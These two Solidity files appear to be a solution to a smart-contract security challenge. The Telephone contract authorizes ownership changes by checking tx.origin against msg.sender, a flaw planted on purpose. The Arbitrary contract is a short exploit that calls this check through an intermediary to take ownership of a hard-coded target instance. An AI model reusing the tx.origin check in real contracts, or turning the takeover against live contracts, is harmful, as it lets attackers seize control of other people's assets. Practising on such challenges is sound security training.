// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract Arbitrary {
  
    address target = address(0xdA0c114e9D9bdd4aB7638fa290796bb84F52F3ab);

    function changeOwner() public {
        address owner = address(0x50b13d37B37f596260B6A8B75742CCfC86Aa8340);

        Telephone(target).changeOwner(owner);
    }  
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}